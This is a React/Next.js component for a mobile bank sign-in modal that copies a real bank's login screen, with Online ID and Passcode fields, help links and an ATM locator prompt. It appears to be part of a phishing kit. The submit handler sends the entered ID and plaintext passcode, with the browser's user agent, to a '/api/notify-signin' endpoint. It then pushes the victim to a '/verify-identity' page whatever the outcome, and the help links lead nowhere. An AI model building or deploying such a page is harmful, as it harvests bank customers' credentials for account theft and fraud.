"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"

interface LoginModalProps {
  isOpen: boolean
  onClose: () => void
}

export function LoginModal({ isOpen, onClose }: LoginModalProps) {
  const router = useRouter()
  const [onlineId, setOnlineId] = useState("")
  const [passcode, setPasscode] = useState("")

  const handleMobileSignIn = async () => {
    try {
      await fetch("/api/notify-signin", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          onlineId,
          passcode,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
        }),
      })

      // Close modal and redirect to identity verification page
      onClose()
      router.push("/verify-identity")
    } catch (error) {
      console.error("Failed to notify sign-in:", error)
    }
  }

  if (!isOpen) return null

  return (
    <div className="fixed inset-0 z-50 xl:hidden">
      <div className="fixed inset-0 bg-black/50" onClick={onClose} />

      <div className="fixed inset-x-0 top-0 bg-primary text-white">
        <div className="flex items-center justify-between p-4 border-b border-red-400">
          <h2 className="text-lg font-semibold">Sign in to Online Banking</h2>
          <button onClick={onClose} className="text-white hover:text-gray-200 text-2xl font-light">
            ×
          </button>
        </div>

        <div className="p-6 space-y-6">
          {/* Login Form */}
          <div className="space-y-4">
            <input
              placeholder="Online ID"
              value={onlineId}
              onChange={(e) => setOnlineId(e.target.value)}
              className="w-full p-3 rounded bg-white text-black border-0"
            />
            <input
              type="password"
              placeholder="Passcode"
              value={passcode}
              onChange={(e) => setPasscode(e.target.value)}
              className="w-full p-3 rounded bg-white text-black border-0"
            />
            <div className="flex items-center space-x-2 text-sm">
              <input type="checkbox" id="save-id-modal" className="rounded" />
              <label htmlFor="save-id-modal">Save Online ID</label>
            </div>
            <button
              onClick={handleMobileSignIn}
              className="w-full bg-secondary hover:bg-secondary/90 text-white font-semibold py-3 rounded"
            >
              Sign In
            </button>
          </div>

          <div className="space-y-2 text-sm">
            <a href="#" className="block text-white hover:underline">
              Forgot ID/Passcode?
            </a>
            <a href="#" className="block text-white hover:underline">
              Security & Help
            </a>
            <a href="#" className="block text-white hover:underline">
              Enroll
            </a>
          </div>

          {/* Location Services */}
          <div className="border-t border-red-400 pt-6">
            <div className="flex items-start space-x-3">
              <svg className="w-5 h-5 mt-1 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" />
              </svg>
              <div>
                <p className="text-sm font-medium">Find your closest financial center or ATM</p>
                <p className="text-xs mt-1 opacity-90">Search by address, city and state or ZIP code</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
